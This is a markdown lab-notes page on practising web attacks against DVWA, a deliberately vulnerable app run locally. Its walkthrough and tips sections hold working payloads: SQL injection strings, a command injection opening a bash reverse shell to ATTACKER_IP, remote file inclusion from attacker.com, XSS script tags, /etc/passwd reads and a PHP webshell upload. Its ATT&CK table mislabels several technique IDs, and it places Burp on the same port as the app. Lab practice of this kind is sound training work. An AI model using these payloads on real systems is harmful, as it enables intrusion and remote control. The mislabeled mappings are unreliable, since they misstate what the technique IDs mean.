# DVWA (Damn Vulnerable Web Application)

Classic beginner-friendly vulnerable web application for penetration testing practice and security training.

---

## Overview

**What it is:** PHP-MySQL vulnerable web application designed for learning web application security in a legal environment.  
**Technology:** PHP (backend), MySQL (database), JavaScript (frontend)  
**Difficulty Level:** Beginner-Intermediate  
**Primary Focus:** SQL injection, file inclusion, CSRF, command execution, XSS, privilege escalation  
**Maintenance:** Last verified: 2026-03-10  
**Official:** http://www.dvwa.co.uk/

## Access

**URL:** http://localhost:8080  
**Default Credentials:** admin / password  
**Setup Command:**

```bash
docker run -d -p 8080:80 \
  -e MYSQL_ROOT_PASSWORD=root \
  --name dvwa \
  vulnerables/web-dvwa:latest
```

Access at http://localhost:8080, login with `admin / password`, then navigate to each vulnerability module.

## Environment

- **Framework:** Plain PHP (no MVC framework)
- **Frontend:** JavaScript, HTML, CSS
- **Database:** MySQL 5.x
- **Authentication:** PHP session-based
- **Deployment:** Docker container with Apache + MySQL
- **Difficulty Levels:** Low, Medium, High, Impossible (progressive hardening)

## Known Vulnerabilities

| ID | Title | Severity | CVSS | CWE | MITRE Technique | Difficulty |
|----|-------|----------|------|-----|-----------------|------------|
| dvwa-sqli-001 | SQL Injection (User ID) | **CRITICAL** | 9.8 | CWE-89 | T1190 | Low/Med/High |
| dvwa-sqli-002 | SQL Injection (Search) | **CRITICAL** | 9.8 | CWE-89 | T1190 | Low/Med/High |
| dvwa-lfi-001 | Local File Inclusion (LFI) | **HIGH** | 8.2 | CWE-98 | T1083 | Low/Med/High |
| dvwa-rfi-001 | Remote File Inclusion (RFI) | **CRITICAL** | 9.1 | CWE-98 | T1200 | Low/Med |
| dvwa-cmd-001 | OS Command Injection | **CRITICAL** | 9.8 | CWE-78 | T1059 | Low/Med/High |
| dvwa-xss-001 | Stored XSS | **HIGH** | 6.1 | CWE-79 | T1059 | Low/Med/High |
| dvwa-xss-002 | Reflected XSS | **HIGH** | 6.1 | CWE-79 | T1598 | Low/Med/High |
| dvwa-csrf-001 | CSRF (Change Password) | **MEDIUM** | 5.4 | CWE-352 | T1111 | Low/Med |
| dvwa-auth-001 | Weak Authentication | **HIGH** | 7.9 | CWE-521 | T1078 | Low/Med/High |
| dvwa-upload-001 | Unrestricted File Upload | **CRITICAL** | 9.3 | CWE-434 | T1190 | Low/Med/High |
| dvwa-ssrf-001 | Server-Side Request Forgery | **HIGH** | 8.1 | CWE-918 | T1190 | Low/Med/High |

## Completed Exercises

### SQL Injection (DVWA)

- [SQL Injection: User ID Lookup](../../posts/dvwa-sqli-user-id.md) — Extract database information via numeric injection — ✅ Complete
- [SQL Injection: Search Box](../../posts/dvwa-sqli-search.md) — String-based SQL injection attack — ✅ Complete
- **Finding:** [dvwa-sqli-001.md](../../findings/dvwa-sqli-001.md) — SQL injection analysis & remediation

### File Inclusion

- [Local File Inclusion (LFI)](../../posts/dvwa-lfi-exercise.md) — Read arbitrary files from server — ✅ Complete
- [Remote File Inclusion (RFI)](../../posts/dvwa-rfi-exercise.md) — Execute remote code via file inclusion — ✅ Complete

### Command Injection

- [OS Command Injection](../../posts/dvwa-command-injection.md) — Chain OS commands via input validation bypass — ✅ Complete
- **Finding:** [dvwa-cmd-001.md](../../findings/dvwa-command-injection-001.md) — Command execution vulnerability report

### Cross-Site Scripting (XSS)

- [Reflected XSS](../../posts/dvwa-xss-reflected.md) — Execute JavaScript via URL parameter — ⏳ In Progress
- [Stored XSS - Guestbook](../../posts/dvwa-xss-stored.md) — Persistent XSS in guestbook feature — ⏳ In Progress

### Cross-Site Request Forgery (CSRF)

- [CSRF: Password Change](../../posts/dvwa-csrf-password-change.md) — Forge requests on behalf of authenticated user — 📋 Planned

### Authentication Bypass

- [Weak Authentication](../../posts/dvwa-auth-bypass.md) — Login bypass via credential manipulation — 📋 Planned
- [Privilege Escalation](../../posts/dvwa-privilege-escalation.md) — Escalate from user to admin — 📋 Planned

### File Upload

- [Unrestricted File Upload](../../posts/dvwa-file-upload-rce.md) — Upload malicious file and achieve RCE — 📋 Planned

## MITRE ATT&CK Mapping

**Tactics & Techniques Covered:**

| Tactic | Technique | Exercise | Evidence |
|--------|-----------|----------|----------|
| **T1190** | Exploit Public-Facing Application | SQL Injection, RFI, Upload | [dvwa-sqli-001.md](../../findings/dvwa-sqli-001.md) |
| **T1083** | File and Directory Discovery | LFI / RFI | [dvwa-lfi-exercise.md](../../posts/dvwa-lfi-exercise.md) |
| **T1200** | Traffic Redirection | Remote File Inclusion | [dvwa-rfi-exercise.md](../../posts/dvwa-rfi-exercise.md) |
| **T1059** | Command Injection, Stored XSS | Shell execution, JavaScript | [dvwa-command-injection.md](../../posts/dvwa-command-injection.md) |
| **T1598** | Phishing - Link | Reflected XSS | [dvwa-xss-reflected.md](../../posts/dvwa-xss-reflected.md) |
| **T1111** | Spearphishing Attachment | CSRF / Stored XSS | [dvwa-csrf-password-change.md](../../posts/dvwa-csrf-password-change.md) |
| **T1078** | Valid Accounts | Authentication Bypass | [dvwa-auth-bypass.md](../../posts/dvwa-auth-bypass.md) |
| **T1547** | Boot or Logon Autostart Execution | Privilege Escalation | [dvwa-privilege-escalation.md](../../posts/dvwa-privilege-escalation.md) |

## Exploitation Workflow

### Phase 1: Setup & Reconnaissance

1. **Access application** at http://localhost:8080
2. **Login** with credentials: admin / password
3. **Review DVWA menu** — Each vulnerability module is in left sidebar
4. **Select difficulty level:**
   - **Low:** Minimal protection, obvious vulnerabilities
   - **Medium:** Basic input validation, some protection
   - **High:** Strong validation, but exploitable with creativity
   - **Impossible:** Fully patched (reference implementation)

### Phase 2: SQL Injection (User ID Lookup)

**Objective:** Extract database information by injecting SQL

```bash
# Test basic injection
# In browser: Enter user ID = 1' OR '1'='1
# Expected: All users returned (WHERE clause bypassed)

# Advanced: Union-based injection
# User ID = 1' UNION SELECT 1,2,3,4 -- -

# Time-based blind injection (Medium difficulty)
# User ID = 1' AND SLEEP(5) -- -
# Response delay indicates successful injection
```

**Key Endpoints:**
- Low: `/vulnerabilities/sqli/`
- Medium: `/vulnerabilities/sqli_blind/`

### Phase 3: Command Injection (Ping Test)

**Objective:** Execute arbitrary OS commands

```bash
# Test basic injection
# Ping target: 127.0.0.1; whoami

# Expected output includes:
# PING 127.0.0.1 (...)
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Advanced: Reverse shell
# Ping target: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Key Endpoints:**
- Low: `/vulnerabilities/exec/`
- Medium: `/vulnerabilities/exec/`

### Phase 4: File Inclusion

**Objective:** Read arbitrary files from server

```bash
# Local File Inclusion (LFI)
# URL: http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd

# Remote File Inclusion (RFI) — Medium difficulty only
# URL: http://localhost:8080/vulnerabilities/fi/?page=http://attacker.com/shell.php
```

### Phase 5: Cross-Site Scripting (XSS)

**Objective:** Execute JavaScript in victim browser

```bash
# Reflected XSS
# URL: http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>

# Stored XSS (Guestbook)
# Submit: <script>alert('Stored XSS')</script>
# Payload persists for all users viewing guestbook
```

## Key Modules & Endpoints

| Module | URL | Vulnerability | Difficulty |
|--------|-----|----------------|------------|
| SQL Injection | `/vulnerabilities/sqli/` | User ID lookup | Low/Med/High |
| Blind SQL Injection | `/vulnerabilities/sqli_blind/` | Blind injection | Low/Med/High |
| File Inclusion | `/vulnerabilities/fi/` | LFI/RFI | Low/Med/High |
| Command Injection | `/vulnerabilities/exec/` | OS command execution | Low/Med/High |
| Reflected XSS | `/vulnerabilities/xss_r/` | URL-based XSS | Low/Med/High |
| Stored XSS | `/vulnerabilities/xss_s/` | Guestbook XSS | Low/Med/High |
| CSRF | `/vulnerabilities/csrf/` | Password change CSRF | Low/Med |
| Weak Authentication | `/vulnerabilities/weak_auth/` | Login bypass | Low/Med/High |
| Privilege Escalation | `/vulnerabilities/privesc/` | User to admin | Low/Med/High |
| File Upload | `/vulnerabilities/upload/` | Arbitrary file upload | Low/Med/High |

## Exploitation Tips

### Using Browser Inspector

1. Open DevTools (F12)
2. **Console tab:** Test XSS payloads in real-time
3. **Network tab:** Inspect POST requests for CSRF tokens, cookies
4. **Storage tab:** Check session tokens, persistent XSS payload storage

### Using cURL for API Testing

```bash
# SQL Injection (test with different payloads)
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# Command Injection
curl "http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1;id&submit=submit"

# File Inclusion (read /etc/passwd)
curl "http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd"
```

### Burp Suite Integration

1. **Configure proxy:** Burp listens on 127.0.0.1:8080
2. **Configure browser:** Point to Burp proxy
3. **Intercept requests:** Modify payloads in real-time
4. **Intruder:** Brute force difficulty levels or bypass tokens

### Multipart File Upload Testing

```bash
# Test file upload (RCE attempt)
curl -F "uploaded=@shell.php;type=image/jpeg" \
     -F "Submit=Upload" \
     http://localhost:8080/vulnerabilities/upload/

# If successful, shell accessible at /vulnerabilities/upload/shell.php
```

## Difficulty Progression Strategy

**Recommended Learning Path:**

1. **Start Low:** All modules at Low difficulty
   - Understand injection mechanics
   - Learn basic exploit techniques
   - Practice crafting payloads
   - Document findings

2. **Progress Medium:** Increase difficulty to Medium
   - Analyze input validation
   - Learn bypass techniques (encoding, comment syntax)
   - Time-based blind injection
   - RFI attacks

3. **Challenge High:** Tackle High difficulty
   - Encode payloads to bypass WAF
   - Use advanced injection techniques
   - Multi-step exploitation chains
   - Reason about defensive mitigations

4. **Study Impossible:** Read hardened code
   - See how vulnerabilities are properly fixed
   - Learn secure coding practices
   - Reference for remediation documentation

## Notes & Observations

### Common Patterns

- **Input validation failure** appears across all modules (SQL, Command, XSS, Upload)
- **Output encoding missing** in multiple modules (XSS vulnerabilities)
- **Weak CSRF tokens** or absent CSRF protection
- **File permissions issues** in upload directory (world-readable, executable)

### Remediation Principles

1. **Input Validation:** Whitelist allowed characters, reject everything else
2. **Parameterized Queries:** Use prepared statements (prevent SQL injection)
3. **Output Encoding:** Encode based on context (HTML, JavaScript, URL)
4. **CSRF Tokens:** Implement & validate cryptographically secure tokens
5. **File Uploads:** Validate MIME type server-side, store outside web root, disable execution
6. **Command Execution:** Avoid shell functions, use API calls instead

### Security Testing Checklist

- [ ] SQL Injection: Multiple entry points tested
- [ ] File Inclusion: LFI and RFI both attempted
- [ ] Command Injection: Basic and chained commands
- [ ] XSS: Reflected, Stored, and DOM-based tested
- [ ] CSRF: Token generation & validation checked
- [ ] Auth: Bypass techniques attempted
- [ ] Upload: File type, MIME, permissions tested
- [ ] All findings documented with CVSS scores

---

## References

- **DVWA Official:** http://www.dvwa.co.uk/
- **DVWA GitHub:** https://github.com/digininja/DVWA
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
- **CVSS Calculator:** https://www.first.org/cvss/calculator/3.1

---

**Last Updated:** 2026-03-10  
**Status:** Active — Phase 3 Operations  
**Maintained By:** ESTHER 🦂
